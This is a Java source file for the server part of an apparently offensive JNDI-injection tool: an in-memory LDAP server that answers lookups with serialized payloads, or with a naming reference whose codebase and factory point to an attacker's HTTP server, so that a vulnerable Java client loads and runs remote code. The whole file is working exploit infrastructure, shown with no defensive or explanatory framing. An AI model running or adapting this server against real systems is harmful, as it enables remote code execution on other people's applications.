package com.example.exploit.server;

import com.example.exploit.Dispatcher;
import com.example.exploit.util.SerializeUtil;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.util.Hashtable;

public class LDAPServer implements Runnable {
    private int port;
    private int httpPort;

    public LDAPServer(int port, int httpPort) {
        this.port = port;
        this.httpPort = httpPort;
    }

    @Override
    public void run() {

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    this.port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(this.httpPort));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("[LDAP] Listening on 0.0.0.0:" + port);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private int httpPort;

        public OperationInterceptor(int httpPort) {
            this.httpPort = httpPort;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult searchResult, String base, Entry e) throws Exception {

            String path = "/" + base.split(",")[0];
            String codebase = "http://" + searchResult.getConnectedAddress() + ":" + this.httpPort + "/";

            Hashtable<String, String> params = new Hashtable<>();
            params.put("codebase", codebase);

            System.out.println("[LDAP] Send result for " + path);
            Hashtable<String, Object> result = Dispatcher.dispatch(path, params);

            e.addAttribute("javaClassName", "foo");

            if (result.containsKey("ref")) {
                e.addAttribute("javaSerializedData", SerializeUtil.serialize(result.get("ref")));
            } else if(result.containsKey("data")) {
                e.addAttribute("javaSerializedData", (byte[]) result.get("data"));
            } else {
                e.addAttribute("objectClass", "javaNamingReference");
                e.addAttribute("javaCodebase", (String) result.get("codebase"));
                e.addAttribute("javaFactory", (String) result.get("factory"));
            }

            searchResult.sendSearchEntry(e);
            searchResult.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
